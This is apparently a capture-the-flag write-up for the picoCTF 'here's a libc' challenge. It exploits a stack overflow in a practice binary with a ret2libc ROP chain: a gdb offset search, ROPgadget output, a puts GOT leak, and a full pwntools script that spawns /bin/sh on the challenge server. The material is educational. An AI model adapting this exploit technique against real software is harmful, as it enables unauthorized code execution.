# here's a libc
> challenge description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774

given: binary vuln, libc.so.6, Makefile

## running the binary locally

gives a segmentation fault.

fixed this with pwninit (grabs the correct linker and creates a new binary that i can actually run called vuln_patched)

```console
┌──[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC]
└──╼ $./vuln_patched 
WeLcOmE To mY EcHo sErVeR!
test
TeSt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
Segmentation fault
```

## finding the vulnerability

looks like there's a basic stack-based overflow.

but NX is enabled, so if the normal buffer-overflow exploits try to put code on the stack and execute it, it won't work.

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC]
└──╼ $checksec vuln_patched
[*] '/home/user/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC/vuln_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
## bypassing NX bit using return-to-libc

requirement: a basic stackbased overflow vulnerability

since ALSR is disabled, libc base address would remain constant/static 

ROPGadets in x64:
* pop rdi is used to pop stack into rdi because in 64 bit arch, argumgents are put into register instead of stack
* 4 argument is rdi -> rsi -> rdx -> rcx

#### find a pop rdi to use

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC]
└──╼ $ROPgadget --binary vuln_patched | grep rdi;
0x00000000004006c9 : and bl, ch ; or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
0x00000000004006cb : or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
0x00000000004006c2 : or dword ptr [rdi], ecx ; mov dh, 0x45 ; cld ; add eax, 0x20 ; jmp 0x4006d6
0x0000000000400913 : pop rdi ; ret
0x00000000004006c8 : shl byte ptr [rax], 0xeb ; or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
```
the pop rdi address to use: `0x0000000000400913`

#### find the offset needed to overwrite rsp

```assembly
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /home/user/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC_tcache/vuln_patched 
WeLcOmE To mY EcHo sErVeR!
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AaA%AaSaAbAa$aAnAaCaA-Aa(aAdAa;aA)AaEaAaAa0aAfAaBaA1AaGaAcAa2aAhAaDaA3AaIaAeAa4aAjAaFaA5AaKaAgAa6aAlAAhAA7AAMAAiAA8AANAAd

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7a ('z')
RBX: 0x0 
RCX: 0x7ffff7af4264 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x7ffff7dd07e3 --> 0xdd18c0000000000a 
RDI: 0x1 
RBP: 0x6c41415041416b41 ('AkAAPAAl')
RSP: 0x7fffffffde78 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x400770 (<do_stuff+152>:	ret)
R8 : 0x79 ('y')
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x1b 
R13: 0x0 
R14: 0x1b 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400769 <do_stuff+145>:	call   0x400540 <puts@plt>
   0x40076e <do_stuff+150>:	nop
   0x40076f <do_stuff+151>:	leave  
=> 0x400770 <do_stuff+152>:	ret    
   0x400771 <main>:	push   rbp
   0x400772 <main+1>:	mov    rbp,rsp
   0x400775 <main+4>:	push   r15
   0x400777 <main+6>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde78 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffde80 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffde88 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffde90 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffde98 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffdea0 ("AuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffdea8 ("AAYAAwAAZAAxAAyA")
0056| 0x7fffffffdeb0 ("ZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400770 in do_stuff ()
gdb-peda$ x/xg $rsp
0x7fffffffde78:	0x41416d4141514141
gdb-peda$ pattern offset 0x41416d4141514141
4702159612987654465 found at offset: 136
```

offset needed: 136

#### find the address of the puts function in the GOT (global offset table) and PLT (procedural link table) of the binary.

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC_tcache]
└──╼ $objdump -D vuln_patched | grep puts
0000000000400540 <puts@plt>:
  400540:	ff 25 d2 0a 20 00    	jmp    *0x200ad2(%rip)        # 601018 <puts@GLIBC_2.2.5>
  400769:	e8 d2 fd ff ff       	call   400540 <puts@plt>
  400891:	e8 aa fc ff ff       	call   400540 <puts@plt>

```
when the puts function calls itself in the GOT it leaks its location in the binary which changes every time we run the program

so combining all of those, the initial payload (to leak the address of the puts function) will be: 
1. 136 junk bytes
2. Address of (pop rdi) gadget
3. Address of puts function in GOT (which will be the argument)
4. Address of puts function in PLT (which will be the actual function to call)

*initial payload (to leak puts function)*
```python3
from pwn import *

context(os='linux', arch='amd64')
p = process('./vuln_patched')
put_plt_addr = p64(0x400540)
put_got_addr = p64(0x601018)
pop_rdi_gadget = p64(0x400913)

payload = b'A' * 136
payload += pop_rdi_gadget
payload += put_got_addr
payload += put_plt_addr
p.clean()
p.sendline(payload)
p.recvline()

p.interactive()
```
results:

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC]
└──╼ $python3 test2.py
[+] Starting local process './vuln_patched': pid 145751
[*] Switching to interactive mode
0J\xa6\xf7\xff
$      [*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Process './vuln_patched' stopped with exit code -11 (SIGSEGV) (pid 145751)
```
process crashed, but we **do not** want it to crash when running the exploit because the address will change every time the binary is executed.

solution: so, we would want to save the leaked address + make the program return to main() to continue running.

#### getting address of main() function

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/Heres_a_LIBC_tcache]
└──╼ $objdump -D vuln_patched | grep main
  4005b4:	ff 15 36 0a 20 00    	call   *0x200a36(%rip)        # 600ff0 <__libc_start_main@GLIBC_2.2.5>
0000000000400771 <main>:
  40084b:	eb 33                	jmp    400880 <main+0x10f>
  400888:	72 c3                	jb     40084d <main+0xdc>
  4008a0:	eb f4                	jmp    400896 <main+0x125>
```

#### putting it all together

need to get the offset = leaked(puts() in GOT) - puts_libc

we also need a "/bin/sh" to get a shell after exploitation

updating the exploit to leak the puts() address > return to main() > execute /bin/sh
* main() address in bitterman binary : `0x400771`
* puts() address in libc.so.6 : `ELF("./libc.so.6").symbols['puts']`
* system() address in libc.so.6 : `ELF("./libc.so.6").symbols['system']`
* "/bin/sh" string in libc.so.6 : `next(ELF("./libc.so.6").search(b"/bin/sh"))`

## final exploit script
```python3
#!/usr/bin/env python3
## https://akshit-singhal.medium.com/rop-chain-exploit-with-example-7e444939a2ec

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 1774)

    return r


def main():
    p = conn()
    context(os='linux', arch='amd64')
    put_plt_addr = p64(0x400540)                     # $ objdump -D vuln_patched | grep puts;;; (400540:	ff 25 d2 0a 20 00    	jmp    *0x200ad2(%rip))
    put_got_addr = p64(0x601018)                     # $ objdump -D vuln_patched | grep puts;;; (# 601018 <puts@GLIBC_2.2.5>)
    main_plt_addr = p64(0x400771)                    # $ objdump -D vuln_patched | grep main;;; (0000000000400771 <main>:)
    pop_rdi_gadget = p64(0x400913)                   # $ ROPgadget --binary vuln_patched | grep rdi; (0x0000000000400913 : pop rdi ; ret)
    
    # gdb > pattern create 200 > x/xg $rsp > pattern offset 0x41416d4141514141 for padding
    payload = b'A'*136
    payload += pop_rdi_gadget
    payload += put_got_addr
    payload += put_plt_addr
    payload += main_plt_addr
    p.clean()
    p.sendline(payload)
    p.recvline()
    p.recvline()

    received_line = p.recvline().strip()
    leaked = u64(received_line.ljust(8, b"\x00"))   # gets 8 bytes from the response, b"\x00" will be added if not enough & turns to string
    log.info(f"leaked address: {hex(leaked)}")

    libc.address = leaked - libc.symbols['puts']    # finding offset
    log.info(f"libc base address: {hex(libc.address)}")

    bin_sh = next(libc.search(b"/bin/sh"))
    system = libc.symbols['system']
    ret = p64(0x40052e)                             # $ ROPgadget --binary vuln_patched | grep ret;; (find only "ret" instruction & add to avoid segfault)

        # segfault will occur due to alternative stack alignments in Ubuntu 18.04. 
        # solution is to find a simple ret address within the binary, and use that to re-align the stack after using /bin/sh
    
    log.info(f"/bin/sh: {hex(bin_sh)}")
    log.info(f"system: {hex(system)}")

    payload2 = b'A'*136
    payload2 += pop_rdi_gadget
    payload2 += p64(bin_sh)
    payload2 += ret
    payload2 += p64(system)
    
    p.clean()

    # log.info("Payload 2: " + str(payload2))

    p.sendline(payload2)
    p.interactive()

if __name__ == "__main__":
    main()
```
